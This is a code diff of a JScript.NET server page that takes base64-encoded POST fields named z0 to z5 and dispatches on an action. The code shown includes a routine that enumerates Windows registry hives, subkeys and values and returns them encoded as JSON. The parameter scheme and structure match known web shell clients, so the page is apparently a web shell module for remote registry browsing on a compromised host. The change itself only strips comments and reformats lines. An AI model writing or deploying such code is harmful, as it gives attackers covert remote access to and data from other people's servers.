@@ -86,25 +86,21 @@ function CheckHives() : String {
 
 function ScanRegistry(base_path : String) : String {
     try {
-        // 1. Clean up trailing backslash if it exists (e.g., "HKLM\Software\" -> "HKLM\Software")
         if (base_path.length > 19 && base_path.substr(base_path.length - 1) == "\\") {
             base_path = base_path.substring(0, base_path.length - 1);
         }
 
-        // 2. Extract and validate the base Root Hive Key
         var rootKey : Microsoft.Win32.RegistryKey = GetHiveKey(base_path);
         if (rootKey == null) {
             return '{"success":false,"error":"Invalid root hive","subkeys":[],"values":[]}';
         }
 
-        // 3. Extract the sub-path safely
         var subPath = "";
         var slashIndex = base_path.indexOf("\\");
         if (slashIndex != -1) {
             subPath = base_path.substring(slashIndex + 1);
         }
 
-        // 4. Open the SubKey (If subPath is empty, open the rootKey itself)
         var targetKey : Microsoft.Win32.RegistryKey = null;
         if (subPath == "") {
             targetKey = rootKey;
@@ -116,14 +112,12 @@ function ScanRegistry(base_path : String) : String {
             return '{"success":false,"error":"Key not found or access denied","subkeys":[],"values":[]}';
         }
 
-        // 5. Gather SubKeys
         var subkeysArr = targetKey.GetSubKeyNames();
         var subkeysList = [];
         for (var i = 0; i < subkeysArr.length; i++) {
             subkeysList.push('"' + EscapeJson(base_path + "\\" + subkeysArr[i]) + '"');
         }
 
-        // 6. Gather Values and Data
         var valuesArr = targetKey.GetValueNames();
         var valuesList = [];
         for (var j = 0; j < valuesArr.length; j++) {
@@ -149,7 +143,6 @@ function ScanRegistry(base_path : String) : String {
             valuesList.push('{"name":"' + EscapeJson(vName) + '","type":"' + GetRegistryValueKindString(vKind) + '","data":"' + base64Data + '"}');
         }
 
-        // Only close it if it was a opened SubKey; do not close the global root static objects
         if (subPath != "") {
             targetKey.Close();
         }
@@ -234,12 +227,12 @@ Response.ContentEncoding = System.Text.Encoding.UTF8;
 
 Server.ScriptTimeout = 900;
 
-var action  = base64Decode(Request.Form["z0"], "utf-8");
-var z1      = base64Decode(Request.Form["z1"], "utf-8");
-var z2      = base64Decode(Request.Form["z2"], "utf-8");
-var z3      = base64Decode(Request.Form["z3"], "utf-8");
-var z4      = base64Decode(Request.Form["z4"], "utf-8");
-var z5      = base64Decode(Request.Form["z5"], "utf-8");
+var action = base64Decode(Request.Form["z0"], "utf-8");
+var z1 = base64Decode(Request.Form["z1"], "utf-8");
+var z2 = base64Decode(Request.Form["z2"], "utf-8");
+var z3 = base64Decode(Request.Form["z3"], "utf-8");
+var z4 = base64Decode(Request.Form["z4"], "utf-8");
+var z5 = base64Decode(Request.Form["z5"], "utf-8");
 
 switch (String(action)) {
     case "hive":
